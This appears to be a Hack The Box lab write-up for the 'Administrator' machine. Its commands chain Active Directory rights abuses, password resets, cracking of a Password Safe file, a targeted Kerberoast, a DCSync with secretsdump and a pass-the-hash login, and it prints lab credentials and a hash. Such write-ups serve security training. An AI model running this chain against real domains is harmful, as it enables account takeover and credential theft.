+++
title = 'Hack The Box — Administrator Writeup'
date = '2026-06-13'
draft = false
tags = ["Hack The Box", "Windows", "Active Directory"]
summary = 'A medium-rated Active Directory box which involves chaining rights abuses to compromise users, gain access to FTP to discover a Password Safe file and execute a targeted Kerberoast and DCSync attack to compromise the domain.'
[cover]
image = 'main.png'
+++

This is a walkthrough of the machine Administrator from Hack The Box.

Machine information:
- **Difficulty**: Medium‍
- **OS**: Windows
- **Area of interest**: Enterprise Network, Vulnerability Assessment, Active Directory, Protocols, Common Services, Security Tools
- **Vulnerability**: Group Membership, Misconfiguration
- **Language**: Powershell
- **Technology**: SMB, FTP, Kerberos, WinRM
- **Technique**: Reconnaissance, Password Cracking, Kerberoasting

# Nmap

```bash
sudo nmap -A -sC -sV --open -v -p- <IP>
```

Starting off with an Nmap scan, we discover that the machine is a **domain controller**, and that the domain name is **administrator.htb**.

{{< figure src="image_1.png" align="center" >}}

# Initial access

We are provided with the following credentials to start off the box:

```
Olivia
ichliebedich
```

Firstly, we can use `evil-winrm` to get a shell as **olivia**:

```bash
evil-winrm -i <IP> -u olivia -p ichliebedich
```

# Domain enumeration with BloodHound

## Owning michael

Next, we will upload the **SharpHound** executable, start the collector and ingest the files into **BloodHound**.

Looking at olivia's outbound controls, we discover that we have `GenericAll` over **michael** - this grants us full control over michael:

{{< figure src="image_2.png" align="center" >}}

Clicking on the `GenericAll` edge in BloodHound, we can find multiple ways to abuse this right, for our purposes we will **reset michael's password**:

{{< figure src="image_3.png" align="center" >}}

```powershell
net user michael michael123! /domain
```

Resetting michael's password will allow us to use **WinRM** and get access as this user - as michael is also part of the `Remote Management Users` group:

{{< figure src="image_4.png" align="center" >}}

```bash
evil-winrm -i <IP> -u michael -p michael123!
```

## Owning benjamin

After using `evil-winrm` to get access as michael, we will go back to BloodHound and see what else we can abuse to further our access.

Looking at michael's **outbound object controls**, we find that we have `ForceChangePassword` over **benjamin**:

{{< figure src="image_5.png" align="center" >}}

Clicking on the `ForceChangePassword` edge, we can find a method to abuse this right with **PowerView**:

{{< figure src="image_6.png" align="center" >}}

First, we will upload **PowerView** via `evil-winrm`, and **import it**:

```
upload powerview.ps1
```

```powershell
Import-Module .\powerview.ps1
```

And then reset benjamin's password:

```powershell
$UserPassword = ConvertTo-SecureString 'benjamin123!' -AsPlainText -Force;Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword
```

# FTP Enumeration

The user benjamin is not part of the Remote Management Users group, however using `netexec` with benjamin's credentials, we discover that we can now access FTP on the machine:

```bash
netexec ftp <IP> -u benjamin -p 'benjamin123!'
```

{{< figure src="image_7.png" align="center" >}}

Looking at what's available via FTP, we find a file named `Backup.psafe3`.

```bash
ftp <IP>
```

{{< figure src="image_8.png" align="center" >}}

This is a **Password Safe** file, which is password-protected.

We can crack it using `hashcat`, which reveals the password `tekieromucho`:

```bash
hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt --force
```

{{< figure src="image_9.png" align="center" >}}

To open it, we can use the `pwsafe` command, and enter the password when prompted:

```bash
pwsafe Backup.psafe3
```

The file contains credentials for **three** additional users:

{{< figure src="image_10.png" align="center" >}}

```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

# Initial access as emily for the user flag

We can use emily's credentials to `evil-winrm` into the machine, and read the first `user.txt` flag:

```bash
evil-winrm -i <IP> -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

{{< figure src="image_11.png" align="center" >}}

# Owning ethan

Going back to **BloodHound**, we find that **emily** has `GenericWrite` over **ethan** - which we can abuse to assign an SPN to ethan, and perform a **targeted Kerberoast**:

{{< figure src="image_12.png" align="center" >}}

{{< figure src="image_13.png" align="center" >}}

Executing the attack, we get ethan's hash:

```bash
faketime "$(ntpdate -q <IP> | cut -d ' ' -f 1,2)" ./targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip <IP>
```

>This box is finicky at this point, and you will probably get the error "*Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)*" - use `faketime` to fix this as shown above.

Using hashcat, we find ethan's password - `limpbizkit`:

```bash
hashcat -m 13100 ethan.kerberoast /usr/share/wordlists/rockyou.txt --force
```

{{< figure src="image_14.png" align="center" >}}

# Privilege escalation

Going back to **BloodHound** for the final time, we find that **ethan** has `GetChangesAll` and `GetChanges` over the **domain**, allowing us to execute a **DCSync**:

{{< figure src="image_15.png" align="center" >}}

{{< figure src="image_16.png" align="center" >}}

{{< figure src="image_17.png" align="center" >}}

Executing the attack with `impacket-secretsdump`, we find **Administrator**'s hash, which we can use to `evil-winrm` into the machine, and read the second `root.txt` flag:

```bash
impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@<IP>
```

{{< figure src="image_18.png" align="center" >}}

```bash
evil-winrm -i <IP> -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

{{< figure src="image_19.png" align="center" >}}